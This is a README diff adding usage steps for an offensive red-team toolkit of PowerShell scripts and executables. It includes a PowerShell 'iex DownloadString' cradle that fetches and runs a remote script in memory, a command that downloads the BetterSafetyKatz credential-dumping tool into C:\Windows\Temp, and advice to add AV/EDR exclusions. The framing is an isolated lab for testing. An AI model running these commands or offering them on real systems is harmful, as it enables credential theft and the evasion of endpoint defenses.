@@ -15,6 +15,40 @@ Run everything in a safe, isolated lab (e.g., air-gapped VMs, snapshots you can 
 
 ---
 
+## Instructions of Use
+
+To get started with the RedForest Toolkit, follow these steps:
+
+### 1. Recursive Cloning
+Since this repository relies on multiple sub-projects and external modules, a standard clone is not enough. Ensure you fetch everything by using the `--recursive` flag:
+
+```bash
+git clone --recursive https://github.com/RealFadyMoheb/RedForest-Toolkit.git
+```
+
+### 2. Environment Setup
+*   **Isolated Lab:** Always run these tools in a dedicated, non-connected lab environment.
+*   **Exclusions:** You may need to add AV/EDR exclusions for the toolkit directory, as many of these tools are flagged by design.
+*   **Dependencies:** Check the `Python/` and `PowerShell/` directories for specific script requirements (e.g., `pip install` for Impacket modules).
+
+### 3. Remote Loading & Deployment
+For quick deployment during testing, you can load PowerShell scripts directly into memory or download executables using the following PowerShell commands:
+
+**Import a PowerShell script (e.g., Get-LAPSPermissions):**
+```powershell
+iex (New-Object Net.Webclient).DownloadString("https://raw.githubusercontent.com/RealFadyMoheb/RedForest-Toolkit/main/PowerShell/Get-LAPSPermissions.ps1")
+```
+
+**Download an executable (e.g., BetterSafetyKatz):**
+```powershell
+(New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/RealFadyMoheb/RedForest-Toolkit/main/EXE/BetterSafetyKatz.exe", "C:\Windows\Temp\BetterSafetyKatz.exe")
+```
+
+### 4. Exploration
+Navigate through the categorized folders (`EXE`, `PowerShell`, `dlls`, etc.) to find the tools relevant to your current research or testing objective.
+
+---
+
 ## Repository contents (directory tree)
 - **dlls/**
   - libeay32.dll
